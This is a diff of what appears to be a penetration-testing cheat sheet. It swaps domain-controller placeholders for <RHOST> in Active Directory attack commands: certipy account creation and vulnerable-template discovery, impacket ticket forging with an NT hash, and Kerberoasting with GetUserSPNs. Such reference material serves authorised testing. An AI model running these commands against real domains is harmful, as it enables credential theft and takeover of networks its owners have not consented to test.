@@ -3035,7 +3035,7 @@ certipy find -dc-ip <RHOST> -u <USERNAME> -p <PASSWORD> -vulnerable -stdout
 ##### Account Creation
 
 ```c
-certipy account create -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -dns <DOMAIN_CONTROLLER_DNS_NAME> -user <COMPUTERNAME>
+certipy account create -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -dns <RHOST> -user <COMPUTERNAME>
 ```
 
 ##### Authentication
@@ -3278,7 +3278,7 @@ impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-
 ###### Issue
 
 ```c
-impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <DOMAIN_CONTROLLER>.<DOMAIN> -no-pass -request
+impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST> -no-pass -request
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 [-] exceptions must derive from BaseException
